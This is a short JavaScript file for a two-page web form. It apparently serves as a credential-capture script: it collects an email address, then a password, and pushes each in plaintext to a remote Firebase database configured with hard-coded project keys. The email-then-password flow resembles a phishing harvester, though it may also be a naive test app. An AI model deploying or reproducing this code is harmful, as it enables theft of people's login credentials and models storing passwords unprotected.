import { initializeApp } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCMctqNHMtGisWfpIh_2ZzfGji3h3t9Z28",
  authDomain: "test-cb276.firebaseapp.com",
  databaseURL: "https://test-cb276-default-rtdb.firebaseio.com",
  projectId: "test-cb276",
  storageBucket: "test-cb276.firebasestorage.app",
  messagingSenderId: "516095332011",
  appId: "1:516095332011:web:37b92dc959310737bdb1ee"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

/* =========================
   PAGE 1 – SAVE EMAIL
========================= */
window.sendData = async () => {
  const emailInput = document.getElementById("email");
  if (!emailInput) return;

  const email = emailInput.value.trim();

  if (!email) {
    alert("Enter email");
    return;
  }

  try {
    await push(ref(database, "users"), {
      email: email,
      createdAt: Date.now()
    });

    // go to next page ONLY after success
    window.location.href = "ss.html";

  } catch (error) {
    console.error(error);
    alert("Failed to send data");
  }
};

/* =========================
   PAGE 2 – SAVE PASSWORD
========================= */
window.savePassword = async () => {
  const passwordInput = document.getElementById("password");
  if (!passwordInput) return;

  const password = passwordInput.value.trim();

  if (!password) {
    alert("Enter password");
    return;
  }

  try {
    await push(ref(database, "passwords"), {
      password: password,
      createdAt: Date.now()
    });

    alert("Saved successfully ✅");

  } catch (error) {
    console.error(error);
    alert("Failed to save password");
  }
};
